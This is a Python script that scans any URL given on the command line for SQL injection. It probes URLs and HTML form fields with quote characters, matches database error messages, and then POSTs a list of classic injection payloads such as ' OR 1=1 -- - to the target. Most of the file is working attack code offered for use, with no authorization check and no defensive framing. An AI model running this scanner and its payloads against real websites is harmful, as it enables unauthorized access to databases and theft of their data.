import requests
from bs4 import BeautifulSoup as bs
from urllib.parse import urljoin
import sys
from pprint import pprint

class SQLI:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36"

    def get_all_forms(self, url):
        """Gets all forms from the HTML content of a given URL."""
        response = self.session.get(url)
        soup = bs(response.content, "html.parser")
        return soup.find_all("form")

    def get_form_details(self, form):
        details = {}
        # get the form action (target url)
        try:
            action = form.attrs.get("action").lower()
        except:
            action = None
        # get the form method (POST, GET, etc.)
        method = form.attrs.get("method", "get").lower()
        # get all the input details such as type and name
        inputs = []
        for input_tag in form.find_all("input"):
            input_type = input_tag.attrs.get("type", "text")
            input_name = input_tag.attrs.get("name")
            input_value = input_tag.attrs.get("value", "")
            inputs.append({"type": input_type, "name": input_name, "value": input_value})
        # put everything to the resulting dictionary
        details["action"] = action
        details["method"] = method
        details["inputs"] = inputs
        return details

    def is_vulnerable(self, response):
        """Checks if a page is SQL Injection vulnerable based on its response."""
        error_strings = {
            "you have an error in your sql syntax;",
            "warning: mysql",
            "unclosed quotation mark after the character string",
            "quoted string not properly terminated",
        }
        return any(error in response.content.decode().lower() for error in error_strings)

    def scan_url(self, url):
        """Scans a URL for SQL Injection vulnerabilities."""
        for quote in "\"'":
            new_url = f"{url}{quote}"
            print(f"[!] Trying {new_url}")
            response = self.session.get(new_url)
            if self.is_vulnerable(response):
                print("[+] SQL Injection vulnerability detected, link:", new_url)
                return

    def scan_forms(self, url):
        forms = self.get_all_forms(url)
        print(f"[+] Detected {len(forms)} forms on {url}.")
        for form in forms:
            form_details = self.get_form_details(form)
            for c in "\"'":
                # the data body we want to submit
                data = {}
                for input_tag in form_details["inputs"]:
                    if input_tag["type"] == "hidden" or input_tag["value"]:
                        # any input form that is hidden or has some value,
                        # just use it in the form body
                        try:
                            data[input_tag["name"]] = input_tag["value"] + c
                        except:
                            pass
                    elif input_tag["type"] != "submit":
                        # all others except submit, use some junk data with special character
                        data[input_tag["name"]] = f"test{c}"
                # join the url with the action (form request URL)
                url = urljoin(url, form_details["action"])
                if form_details["method"] == "post":
                    res = self.session.post(url, data=data)
                elif form_details["method"] == "get":
                    res = self.session.get(url, params=data)
                # test whether the resulting page is vulnerable
                if self.is_vulnerable(res):
                    print("[+] SQL Injection vulnerability detected, link:", url)
                    print("[+] Form:")
                    pprint(form_details)
                    break
    
    def attack(self, url):
        payloads = [
            "' or ",
            "-- or #",
            "' OR '1",
            "' OR 1 -- -",
            "' OR "" = '",
            "' OR 1 = 1 -- -",
            "' OR '' = '",
            "'='",
            "'LIKE'",
            "'=0--+",
            "' OR 1=1",
            "' OR 'x'='x",
            "' AND id IS NULL; --",
        ]
        failed = None
        for payload in payloads:
            req = requests.post(url, data=payload)
            if req.status_code != 200:
                failed = payload
                print("payload failed sent! payload: "+failed)
                break
        print("Payload sent!")

    def scan(self, url):
        """Scans a URL for SQL Injection vulnerabilities in both the URL itself and in HTML forms."""
        self.scan_url(url)
        self.scan_forms(url)
        self.attack(url)

if __name__ == "__main__":
    scanner = SQLI()
    url = sys.argv[1]
    scanner.scan(url)
